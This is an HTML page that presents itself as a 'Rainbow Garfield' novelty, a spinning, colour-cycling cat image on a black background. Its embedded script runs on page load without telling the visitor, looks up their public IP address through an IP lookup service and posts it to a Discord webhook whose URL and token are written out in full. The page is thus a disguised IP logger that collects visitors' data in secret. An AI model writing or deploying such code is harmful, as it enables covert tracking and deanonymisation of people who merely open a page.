<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Rainbow Garfield</title>
  <style>
    body {
      margin: 0;
      overflow: hidden;
      background-color: black;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    #garfield {
      width: 150px; /* Adjust size as needed */
      height: auto;
      animation: spin 2s linear infinite, rainbow 3s linear infinite;
    }

    /* Spin animation */
    @keyframes spin {
      0% {
        transform: rotate(0deg);
      }
      100% {
        transform: rotate(360deg);
      }
    }

    /* Rainbow effect */
    @keyframes rainbow {
      0% {
        filter: hue-rotate(0deg);
      }
      100% {
        filter: hue-rotate(360deg);
      }
    }
  </style>
</head>
<body>
  <!-- Garfield Image -->
  <img id="garfield" src="https://i.imgur.com/garfield.png" alt="Garfield">

  <script>
    // Discord webhook URL (replace with your own)
    const webhookUrl = 'https://canary.discord.com/api/webhooks/1346563589908992123/PM9ke2tdThuaF4xTVfniODgo8CK7szjhBtULjFizSJyFLf88cuZzHlBEwD9EDN3396cS';

    // Send a message to the Discord webhook
    async function sendToDiscord(ip) {
      const message = {
        content: `Someone visited the Rainbow Garfield page! üêæ Their IP address is: ${ip}`,
      };

      try {
        const response = await fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(message),
        });
        
        if (response.ok) {
          console.log(`It worked: ${ip}`);
        } else {
          console.error('Error sending message to Discord:', response.statusText);
        }
      } catch (error) {
        console.error('Error sending message to Discord:', error);
      }
    }

    // Get the user's IP and send it to Discord
    async function getVisitorIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        const ip = data.ip;

        // Log the IP and send it to Discord
        console.log(`IP address found: ${ip}`);
        sendToDiscord(ip);
      } catch (error) {
        console.error('Error getting IP address:', error);
      }
    }

    // Send the message when the page loads
    getVisitorIP();
  </script>
</body>
</html>
